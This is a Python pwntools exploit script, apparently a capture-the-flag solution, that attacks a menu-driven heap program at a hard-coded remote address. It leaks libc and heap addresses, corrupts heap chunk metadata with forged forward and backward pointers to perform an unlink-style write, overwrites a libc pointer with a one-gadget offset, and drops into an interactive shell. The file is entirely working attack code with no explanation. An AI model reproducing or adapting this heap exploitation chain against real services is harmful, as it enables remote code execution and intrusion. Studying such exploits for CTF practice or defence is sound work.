from pwn import *

HOST = "178.128.87.12"
PORT = 31336
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)

def new(name, length, desc):
  s.recvuntil('\x9B\xA9\x20\x20\x20\x20')
  s.sendline('1')
  s.recvuntil('Name :')
  s.send(name)
  s.recvuntil('Len?')
  s.sendline(str(length))
  s.recvuntil('Description:\n')
  s.send(desc)

def edit(index, name, length, desc):
  s.recvuntil('\x9B\xA9\x20\x20\x20\x20')
  s.sendline('2')
  s.recvuntil('\n>')
  s.sendline(str(index))
  s.recvuntil('New name?')
  s.send(name)
  s.recvuntil('Len?')
  s.sendline(str(length))
  time.sleep(0.2)
  s.send(desc)

def delete(index):
  s.recvuntil('\x9B\xA9\x20\x20\x20\x20')
  s.sendline('3')
  s.recvuntil('\n>')
  s.sendline(str(index))

def leak(): 
  s.recvuntil('\x9B\xA9\x20\x20\x20\x20')
  s.sendline('3')
  r = s.recvuntil('\n>')
  s.sendline('0')
  return r

new("ABCD\n",128,"AAA\n")
new("ABCD\n",128,"BBB\n")
delete(1)
new("\n",128,"\n")
r = leak()
libc = u64(r[0x73:0x73+8]) - 0x3c1b58
print "LIBC : ", hex(libc)
new("PWNPWN\n",128,"CCC\n")
delete(1)
delete(2)
new("\n",128,"\n")
r = leak()
heap = u64(r[0x77:0x77+8]) - 0x10
print "HEAP : ", hex(heap)

new("PWNED1\n",0x84,"A"*0x80+"\n")
#new("VICTIM\n",0x100,"C"*0x90+"\n")
new("PWNED2\n",0xb4,"B"*0xb4)
#delete(4)
edit(3,"\x00"*0x10+p64(heap+0x30-0x18)+p64(heap+0x30-0x10)+"\n",0x12c,"P"*(0x144-0x8)+p64(0x180)+p64(0x100)+"\n")
delete(4)
raw_input()
edit(3,p64(heap+0x10)+p64(heap+0x1b0)+p64(0x21)+p64(libc+0x3c1aa0)+p64(heap+0x1b0)+"\n",0x100,"A"*0xc+p64(libc+0x4557a)+"\n")
s.interactive()
